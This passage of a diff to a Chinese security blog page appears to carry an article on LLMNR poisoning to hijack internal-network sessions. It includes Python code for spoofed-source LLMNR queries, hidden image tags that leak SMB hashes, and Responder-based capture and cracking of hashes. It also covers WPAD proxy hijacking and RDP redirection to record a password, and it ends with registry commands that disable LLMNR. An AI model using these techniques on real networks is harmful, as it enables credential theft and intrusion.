class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    llmnr.Answser()<br></code></pre></td></tr></table></figure>
 
 <p>LLMNR 应答执行结果如下图所示：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160820-4c222a64-d413-1.png)</p>
-<p>图6：Python 实现 LLMNR 质询与应答1</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160820-4c222a64-d413-1.png" srcset="/img/loading.gif" lazyload alt="Python 实现 LLMNR 质询与应答1"></p>
 <p>模拟查询主机名称为 <strong>Wooyun</strong> 的结果：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160835-54f37a3a-d413-1.png)</p>
-<p>图7：Python 实现 LLMNR 质询与应答2</p>
-<h3 id="0x04-LLMNR-Poison-攻击原理"><a href="#0x04-LLMNR-Poison-攻击原理" class="headerlink" title="0x04 LLMNR Poison 攻击原理"></a>0x04 LLMNR Poison 攻击原理</h3><p>一个完整的正常的 LLMNR 名称解析过程如图 2 所示，由于 LLMNR 使用无连接的 UDP 协议发送广播，之后多播组内的主机可以对发起名称解析的主机进行应答，因此，在这个过程中，攻击者就有机可乘。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160835-54f37a3a-d413-1.png" srcset="/img/loading.gif" lazyload alt="Python 实现 LLMNR 质询与应答2"></p>
+<h2 id="0x04-LLMNR-Poison-攻击原理"><a href="#0x04-LLMNR-Poison-攻击原理" class="headerlink" title="0x04 LLMNR Poison 攻击原理"></a>0x04 LLMNR Poison 攻击原理</h2><p>一个完整的正常的 LLMNR 名称解析过程如图 2 所示，由于 LLMNR 使用无连接的 UDP 协议发送广播，之后多播组内的主机可以对发起名称解析的主机进行应答，因此，在这个过程中，攻击者就有机可乘。</p>
 <p>攻击者可以将自己的主机加入到组播组中，当收到其他主机进行名称解析的质询请求，就可以对发起此次名称解析的主机进行“恶意”应答，利用此缺陷进行欺骗攻击的方式称为 <strong>LLMNR Poison 攻击</strong>。</p>
 <p> “恶意”应答过程如下图所示：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160859-638cf5c6-d413-1.png)</p>
-<p>图8：攻击者进行“恶意”应答过程图示</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160859-638cf5c6-d413-1.png" srcset="/img/loading.gif" lazyload alt="攻击者进行“恶意”应答过程图示"></p>
 <p>LLMNR 名称解析的最大缺陷就是，在当前局域网中，无论是否存在主机 B（假定机器名为：SECLAB-HER0IN），只要有主机请求 SECLAB-HER0IN 都会进行一次 LLMNR 名称解析。</p>
-<h3 id="0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话"><a href="#0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话" class="headerlink" title="0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话"></a>0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话</h3><p>由于 UDP 是面向无连接的，所以不存在三次握手的过程，因此，在 LLMNR 名称解析过程中，UDP  的不安全性就体现出来了。攻击者可以伪造源 IP 地址向广播地址发送 LLMNR 名称解析质询，之后攻击者再对这个质询进行应答，完全是一场  <strong>“自导自演”</strong> 的戏。</p>
+<h2 id="0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话"><a href="#0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话" class="headerlink" title="0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话"></a>0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话</h2><p>由于 UDP 是面向无连接的，所以不存在三次握手的过程，因此，在 LLMNR 名称解析过程中，UDP  的不安全性就体现出来了。攻击者可以伪造源 IP 地址向广播地址发送 LLMNR 名称解析质询，之后攻击者再对这个质询进行应答，完全是一场  <strong>“自导自演”</strong> 的戏。</p>
 <p>修改 UDP 源 IP 的代码如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, time<br><span class="hljs-keyword">from</span> impacket <span class="hljs-keyword">import</span> ImpactDecoder, ImpactPacket<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">UDPSpoof</span>(<span class="hljs-params">src_ip, src_port, dst_ip, dst_port, data</span>):</span><br>    ip = ImpactPacket.IP()<br>    ip.set_ip_src(src_ip)<br>    ip.set_ip_dst(dst_ip)<br><br>    udp = ImpactPacket.UDP()<br>    udp.set_uh_sport(src_port)<br>    udp.set_uh_dport(dst_port)<br><br>    udp.contains(ImpactPacket.Data(data))<br>    ip.contains(udp)<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)<br>    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="hljs-number">1</span>)<br>    s.sendto(ip.get_packet(), (dst_ip, dst_port))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x09&quot;</span>      <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;Her0in-PC&quot;</span>    <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>    ip_src = <span class="hljs-string">&quot;192.168.169.1&quot;</span><br>    ip_dst = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UDP Source IP Spoof %s =&gt; %s for Her0in-PC&quot;</span> % (ip_src, ip_dst))<br>        UDPSpoof(ip_src, <span class="hljs-number">18743</span>,ip_dst , <span class="hljs-number">5355</span>, QueryData)<br>        time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
 
@@ -322,18 +338,13 @@
 <li>受害者 IP：192.168.169.3，无需任何操作</li>
 </ul>
 <p>当受害者访问内网某台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160934-78309122-d413-1.png)</p>
-<p>图9：攻击者主机启动相应的程序，并提供了 WEB 服务</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160943-7d99c9ee-d413-1.png)</p>
-<p>图10：当受害者访问 win2k3-3a85d681 这台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160954-83e858ec-d413-1.png)</p>
-<p>图11：受害者原本想访问的 WEB 服务器是 Windows Server 2003 却被攻击者“重定向”到了一台 Linux 主机上</p>
-<h3 id="0x06-LLMNR-Poison-实战攻击思路"><a href="#0x06-LLMNR-Poison-实战攻击思路" class="headerlink" title="0x06 LLMNR Poison 实战攻击思路"></a>0x06 LLMNR Poison 实战攻击思路</h3><p>在局域网中，名称解析的行为是非常频繁的，只要有使用计算机名称，准确的说是使用 NetBIOS 名称或非 FQDN 域名的地方都会产生名称解析，如  PING 主机名称，使用主机名称连接各种服务等等。Windows 系统也默认启用了 NetBIOS 和 LLMNR，这就使得 LLMNR  Poison 攻击的实战价值有所提升。但实际上在实战中使用 LLMNR Poison 攻击时，会遇到一些问题，如 5355  端口被占用，防火墙拦截等，不过这些小问题都是可以解决的；另外还有一些不可控的客观因素，如网络稳定性等等，但这些问题也不是非常普遍并且不可解决的。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160934-78309122-d413-1.png" srcset="/img/loading.gif" lazyload alt="攻击者主机启动相应的程序，并提供了 WEB 服务"></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160943-7d99c9ee-d413-1.png" srcset="/img/loading.gif" lazyload alt="当受害者访问 win2k3-3a85d681 这台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器"></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160954-83e858ec-d413-1.png" srcset="/img/loading.gif" lazyload alt="受害者原本想访问的 WEB 服务器是 Windows Server 2003 却被攻击者“重定向”到了一台 Linux 主机上"></p>
+<h2 id="0x06-LLMNR-Poison-实战攻击思路"><a href="#0x06-LLMNR-Poison-实战攻击思路" class="headerlink" title="0x06 LLMNR Poison 实战攻击思路"></a>0x06 LLMNR Poison 实战攻击思路</h2><p>在局域网中，名称解析的行为是非常频繁的，只要有使用计算机名称，准确的说是使用 NetBIOS 名称或非 FQDN 域名的地方都会产生名称解析，如  PING 主机名称，使用主机名称连接各种服务等等。Windows 系统也默认启用了 NetBIOS 和 LLMNR，这就使得 LLMNR  Poison 攻击的实战价值有所提升。但实际上在实战中使用 LLMNR Poison 攻击时，会遇到一些问题，如 5355  端口被占用，防火墙拦截等，不过这些小问题都是可以解决的；另外还有一些不可控的客观因素，如网络稳定性等等，但这些问题也不是非常普遍并且不可解决的。</p>
 <p>下面提供几种在实战中可用的 LLMNR Poison 攻击思路，以 <strong>Responder</strong> 做为攻击工具进行演示。</p>
-<h4 id="劫持会话获取-HASH"><a href="#劫持会话获取-HASH" class="headerlink" title="劫持会话获取 HASH"></a>劫持会话获取 HASH</h4><p>通过劫持会话获取受害者的 HASH，有两种常见的攻击场景：</p>
-<ul>
-<li><strong>劫持 SMB 会话获取 HASH</strong> 利用 LLMNR Poison 攻击劫持 SMB 会话与 SMB Relay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是  SMB Relay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用  LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMB Relay  攻击结合起来，提升攻击力。 </li>
-</ul>
+<h3 id="劫持会话获取-HASH"><a href="#劫持会话获取-HASH" class="headerlink" title="劫持会话获取 HASH"></a>劫持会话获取 HASH</h3><p>通过劫持会话获取受害者的 HASH，有两种常见的攻击场景：</p>
+<h4 id="劫持-SMB-会话获取-HASH"><a href="#劫持-SMB-会话获取-HASH" class="headerlink" title="劫持 SMB 会话获取 HASH"></a>劫持 SMB 会话获取 HASH</h4><p>利用 LLMNR Poison 攻击劫持 SMB 会话与 SMB Relay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是  SMB Relay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用  LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMB Relay  攻击结合起来，提升攻击力。 </p>
 <p>攻击的方式大致为：</p>
 <ul>
 <li>结合社工欺骗受害者访问一个正常的但已嵌入类似于 <code>&lt;img/src=\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 或 <code>&lt;img/src=http:\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 的网页；</li>
@@ -342,22 +353,15 @@
 <li>当然也可以一直启动 Responder 进行监听，不需要其他额外的操作，只要有主机使用计算机名称请求 SMB 或 WEB 服务就可以得到相应主机的 HASH；</li>
 <li>之后使用 John 破解 SMB 会话劫持到的 HASH。</li>
 </ul>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161019-9324c796-d413-1.png)</p>
-<p>图12：SMB 会话劫持，获取 HASH</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161027-97d2bfd2-d413-1.png)</p>
-<p>图13：使用 John 破解 SMB 会话劫持到的 HASH</p>
-<ul>
-<li><strong>使用 HTTP 401 认证获取 HASH</strong></li>
-</ul>
-<p>使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH，劫持会话进行钓鱼：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161042-a10626c0-d413-1.png)</p>
-<p>图14：HTTP 401 认证服务器钓鱼</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161056-a967b112-d413-1.png)</p>
-<p>图15：“钓鱼”攻击获取到了 HASH</p>
-<h4 id="劫持-WPAD-获取上网记录"><a href="#劫持-WPAD-获取上网记录" class="headerlink" title="劫持 WPAD 获取上网记录"></a>劫持 WPAD 获取上网记录</h4><p>在 Windows 系统中，默认启用了 WPAD 功能，可以对 <strong>IE 浏览器-工具-internet-连接-局域网设置-自动检测设置</strong> 和 <strong>系统服务</strong> 中的 <strong>WinHttpAutoProxySvc</strong> 服务进行开关设置。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161019-9324c796-d413-1.png" srcset="/img/loading.gif" lazyload alt="SMB 会话劫持，获取 HASH"></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161027-97d2bfd2-d413-1.png" srcset="/img/loading.gif" lazyload alt="使用 John 破解 SMB 会话劫持到的 HASH"></p>
+<h4 id="使用-HTTP-401-认证获取-HASH"><a href="#使用-HTTP-401-认证获取-HASH" class="headerlink" title="使用 HTTP 401 认证获取 HASH"></a>使用 HTTP 401 认证获取 HASH</h4><p>使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH，劫持会话进行钓鱼：</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161042-a10626c0-d413-1.png" srcset="/img/loading.gif" lazyload alt="HTTP 401 认证服务器钓鱼"></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161056-a967b112-d413-1.png" srcset="/img/loading.gif" lazyload alt="“钓鱼”攻击获取到了 HASH"></p>
+<h3 id="劫持-WPAD-获取上网记录"><a href="#劫持-WPAD-获取上网记录" class="headerlink" title="劫持 WPAD 获取上网记录"></a>劫持 WPAD 获取上网记录</h3><p>在 Windows 系统中，默认启用了 WPAD 功能，可以对 <strong>IE 浏览器-工具-internet-连接-局域网设置-自动检测设置</strong> 和 <strong>系统服务</strong> 中的 <strong>WinHttpAutoProxySvc</strong> 服务进行开关设置。</p>
 <p>启用了 WPAD 的主机，会持续请求名为 <strong>WPAD</strong> 的主机名称，因此可以利用 LLMNR Poison  攻击更改受害者主机的浏览器代理设置，这样就可以在攻击者自己的代理服务器中看到受害者的上网浏览记录，也可以在受害者正在访问的网页中嵌入任何你想要嵌入的恶意脚本代码，如各种钓鱼、弹框认证、下载文件等等。另外，由于  WPAD 是一个系统的 HTTP 代理设置，所以 Windows 更新也会使用这个代理，这样就可以利用 Windows  更新将木马下载到受害者主机并自动执行。</p>
 <p>但是 WPAD 在实战中也同样会受到各种不可控的客观因素的影响，只有手动设置了浏览器代理配置，通过 WPAD 的代理上网的效果才比较明显。</p>
-<h4 id="“剑走偏锋”-获取服务器密码"><a href="#“剑走偏锋”-获取服务器密码" class="headerlink" title="“剑走偏锋” 获取服务器密码"></a>“剑走偏锋” 获取服务器密码</h4><p>上面已经提到，在局域网中只要有主机使用其他主机的名称请求服务就可以产生名称解析行为，现在假定有这样一个场景，在渗透到内网后，进一步渗透的条件很苛刻，这时候你“黔驴技穷”了，为了能在内网中拿到一台服务器，以便“站稳脚跟”，或许你可以采用“剑走偏锋”的思路，利用  LLMNR Poison 攻击进行 3389 连接欺骗，拿到服务器的密码，这样做的确有些冒险，可是总好过你直接修改 IP 去欺骗登录要好很多！</p>
+<h3 id="“剑走偏锋”-获取服务器密码"><a href="#“剑走偏锋”-获取服务器密码" class="headerlink" title="“剑走偏锋” 获取服务器密码"></a>“剑走偏锋” 获取服务器密码</h3><p>上面已经提到，在局域网中只要有主机使用其他主机的名称请求服务就可以产生名称解析行为，现在假定有这样一个场景，在渗透到内网后，进一步渗透的条件很苛刻，这时候你“黔驴技穷”了，为了能在内网中拿到一台服务器，以便“站稳脚跟”，或许你可以采用“剑走偏锋”的思路，利用  LLMNR Poison 攻击进行 3389 连接欺骗，拿到服务器的密码，这样做的确有些冒险，可是总好过你直接修改 IP 去欺骗登录要好很多！</p>
 <p>测试环境如下：</p>
 <ul>
 <li>一台 Windows Server 2008 （Win2k8 支持 LLMNR）作为管理员的主机，IP：172.16.0.8</li>
@@ -369,15 +373,12 @@
 <p>管理员的主机（Win2k8）连接内网服务器（Win2k3）进行常规维护，攻击者（BT5-R3）利用 LLMNR Poison 攻击劫持了 3389 连接会话，<strong>为了更加明显的演示出攻击效果，我将 3389 连接会话重定向到一台 XP 中</strong>。</p>
 <p>攻击效果如下：</p>
 <p>管理员连接内网服务器，但是被LLMNR Poison攻击劫持，重定向到了XP上：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161109-b12561c4-d413-1.png)</p>
-<p>图16：管理员连接内网服务器</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161109-b12561c4-d413-1.png" srcset="/img/loading.gif" lazyload alt="管理员连接内网服务器"></p>
 <p>从攻击者的机器中，也可以看到 Responder 做了“恶意”应答，同时，利用 lcx 转发的 3389 也有数据流动，可以从 IP 中判断出来：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161120-b761d7e8-d413-1.png)</p>
-<p>图17：攻击者机器</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161120-b761d7e8-d413-1.png" srcset="/img/loading.gif" lazyload alt="攻击者机器"></p>
 <p>在 XP 中预先安装某记录登录密码的程序，记录任何成功或失败的登录信息，可以看到管理员输入的登录信息：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128161127-bbbb955e-d413-1.png)</p>
-<p>图18：Windows XP</p>
-<h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>关于 LLMNR Poison 攻击的实战思路还有很多，包括劫持 FTP，MySQL，MSSQL Server 等等，具体的实现可以自由发挥。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161127-bbbb955e-d413-1.png" srcset="/img/loading.gif" lazyload alt="Windows XP"></p>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>关于 LLMNR Poison 攻击的实战思路还有很多，包括劫持 FTP，MySQL，MSSQL Server 等等，具体的实现可以自由发挥。</p>
 <p>为了防止遭到 LLMNR Poison 攻击，可以导入下面的注册表键值关闭 LLMNR：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br>reg add &quot;HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient&quot; /v EnableMulticast /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure>
 
@@ -389,15 +390,22 @@
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
+                      <a class="hover-with-bg" href="/tags/LLMNR/">LLMNR</a>
                     
-                      <a class="hover-with-bg" href="/tags/concept/">concept</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                      <a class="hover-with-bg" href="/tags/%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90/">名称解析</a>
                     
                   </div>
                 
@@ -503,17 +511,17 @@
       
         <!-- 不蒜子统计PV -->
         <span id="busuanzi_container_site_pv" style="display: none">
-            Pageviews: 
+            总访问量: 
             <span id="busuanzi_value_site_pv"></span>
-             times
+             次
           </span>
       
       
         <!-- 不蒜子统计UV -->
         <span id="busuanzi_container_site_uv" style="display: none">
-            Total Visitors: 
+            总访客数: 
             <span id="busuanzi_value_site_uv"></span>
-             persons
+             人
           </span>
       
     
